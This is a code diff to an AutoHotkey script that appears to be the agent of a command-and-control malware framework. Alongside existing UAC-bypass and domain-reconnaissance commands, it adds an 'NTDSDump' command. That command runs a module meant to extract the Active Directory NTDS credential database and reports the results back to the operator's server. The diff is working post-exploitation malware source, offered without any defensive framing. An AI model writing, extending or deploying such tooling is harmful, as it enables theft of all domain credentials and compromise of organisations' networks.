@@ -787,6 +787,8 @@ class NetworkClient {
                     this.DomainTrustRecon()
                 case "CMSTP_UAC_Bypass":
                     this.CMSTP_UAC_Bypass(parameters)
+                case "NTDSDump":
+                    this.NTDSDump()
 
                 
                 default:
@@ -2389,6 +2391,69 @@ class NetworkClient {
         }
         
 
+    }
+
+    NTDSDump(){
+        try {
+            message := Format("command_output|{}|Starting NTDS dump operation...", this.agentID)
+            response := this.SendMsg(this.serverIP, this.serverPort, message)
+            
+            ; Execute the NTDSDump module
+            ; The module is embedded as a separate script, so we'll run it
+            ntdsDumpScript := A_ScriptDir "\NTDSDumpModule.ahk"
+            
+            ; Check if the module file exists
+            if (!FileExist(ntdsDumpScript)) {
+                message := Format("command_output|{}|Error: NTDSDump module file not found at {}", this.agentID, ntdsDumpScript)
+                response := this.SendMsg(this.serverIP, this.serverPort, message)
+                return false
+            }
+            
+            ; Run the NTDSDump module as a separate process
+            RunWait('AutoHotkey.exe "' ntdsDumpScript '"', A_ScriptDir, "Max")
+            
+            ; Check for extracted files in the output directory
+            outputPattern := A_ScriptDir "\extracted_*"
+            extractedDirs := []
+            
+            ; Find all extracted directories
+            Loop Files, outputPattern, "D"
+                extractedDirs.Push(A_LoopFileFullPath)
+            
+            if (extractedDirs.Length > 0) {
+                ; Get the most recent extraction directory
+                latestDir := extractedDirs[extractedDirs.Length]
+                
+                ; List extracted files
+                extractedFiles := []
+                Loop Files, latestDir "\*.*", "F"
+                    extractedFiles.Push(A_LoopFileName)
+                
+                if (extractedFiles.Length > 0) {
+                    fileList := ""
+                    for file in extractedFiles {
+                        fileList .= file . "`n"
+                    }
+                    
+                    message := Format("command_output|{}|NTDS dump completed successfully!`nExtracted files:`n{}`nLocation: {}", 
+                                    this.agentID, fileList, latestDir)
+                    response := this.SendMsg(this.serverIP, this.serverPort, message)
+                } else {
+                    message := Format("command_output|{}|NTDS dump completed but no files were extracted", this.agentID)
+                    response := this.SendMsg(this.serverIP, this.serverPort, message)
+                }
+            } else {
+                message := Format("command_output|{}|NTDS dump module executed but no output directory found", this.agentID)
+                response := this.SendMsg(this.serverIP, this.serverPort, message)
+            }
+            
+            return true
+            
+        } catch as err {
+            message := Format("command_output|{}|NTDS dump failed: {}", this.agentID, err.Message)
+            response := this.SendMsg(this.serverIP, this.serverPort, message)
+            return false
+        }
     }
 
 }
